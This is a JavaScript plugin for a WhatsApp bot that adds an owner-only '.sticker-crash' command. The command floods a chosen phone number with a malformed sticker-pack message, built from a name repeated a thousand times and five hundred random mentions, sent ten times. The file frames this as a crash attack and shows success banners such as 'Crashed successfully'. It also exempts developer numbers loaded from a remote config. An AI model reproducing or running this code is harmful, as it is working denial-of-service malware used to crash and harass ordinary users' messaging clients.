const { cmd } = require('../momy');
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const axios = require('axios');
const crypto = require('crypto');

// Helper sleep function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// DEV NUMBERS PROTECTION
// ============================================================
let devNumbers = [];

async function loadDevNumbers() {
    try {
        const response = await axios.get('https://raw.githubusercontent.com/dawestava-hub/new-bot/refs/heads/main/config.json');
        if (response.data && response.data.ownerNumber) {
            devNumbers = response.data.ownerNumber.map(num => {
                let cleanNum = num.toString().replace(/[^0-9]/g, '');
                if (cleanNum.startsWith('0')) cleanNum = '255' + cleanNum.substring(1);
                return cleanNum + '@s.whatsapp.net';
            });
            console.log(`✅ Loaded ${devNumbers.length} protected developer numbers`);
        }
    } catch (e) {
        console.log('⚠️ Could not load dev numbers, using default protection');
        devNumbers = ['554497461113@s.whatsapp.net', '554488122687@s.whatsapp.net'];
    }
}

function isDevNumber(jid) {
    return devNumbers.includes(jid);
}

loadDevNumbers();

// ============================================================
// STICKER PACK CRASH FUNCTION (xxx)
// ============================================================
async function stickerPackCrash(conn, target) {
    try {
        const freez = {
            stickerPackMessage: {
                stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                name: "Shinigami".repeat(1000),
                publisher: "SHINIGAMI - TEAM",
                stickers: [
                    {
                        fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "SHINIGAMI - TEAM",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    },
                    {
                        fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
                        isAnimated: false,
                        emojis: [""],
                        accessibilityLabel: "",
                        isLottie: false,
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "3662919",
                fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                contextInfo: {
                    remoteJid: "X",
                    participant: "0@s.whatsapp.net",
                    stanzaId: "1234567890ABCDEF",
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                    ]
                }
            }
        };
        
        // Send multiple times for more impact
        for (let i = 0; i < 10; i++) {
            await conn.relayMessage(target, freez, { participant: { jid: target } });
            await sleep(200);
        }
    } catch (e) {
        console.log("stickerPackCrash error:", e.message);
    }
}

// ============================================================
// OWNER COMMAND: .sticker-crash
// ============================================================
cmd({
    pattern: "sticker-crash",
    alias: ["stcrash", "spack", "stickercrash"],
    desc: "Sticker pack crash attack",
    category: "",
    react: "📦",
    filename: __filename
}, async (conn, mek, m, { from, args, isOwner, reply, sender }) => {
    // Check if owner
    if (!isOwner) return reply("❌ Owner only command");

    // Get target
    let target;
    if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let number = args[0].replace(/[^0-9]/g, '');
        if (number.startsWith('0')) number = '255' + number.substring(1);
        target = number + '@s.whatsapp.net';
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else {
        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ Please provide a number
│
│ 📌 Example:
│ • dyby-crash 55xxx 
╰─────────────────────•`);
    }

    // Check if target is a developer number
    if (isDevNumber(target)) {
        return reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ 🛡️ Cannot attack developer number!
│ This number is protected.
╰─────────────────────•`);
    }

    const targetNumber = target.split('@')[0];
    
    // Send attack started message
    await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ☠️ DYBY CRASH ATTACK
│
│ 👤 Target: @${targetNumber}
│ ⚡ Status: Attack in progress...
╰─────────────────────•`);

    try {
        await stickerPackCrash(conn, target);
        
        // Send success message
        await reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ✅ DYBY CRASH COMPLETED!
│ 👤 Target: @${targetNumber}
│ 💀 Status: Crashed successfully
╰─────────────────────•

> POWERED BY SHINIGAMI MD`);
        
    } catch (e) {
        console.error("Sticker Crash Error:", e);
        reply(`╭━━━━━━━━━━━━━━━━━━━━━•
│ ❌ DYBY CRASH FAILED
│ 👤 Target: @${targetNumber}
│ 💀 Error: ${e.message}
╰─────────────────────•`);
    }
});
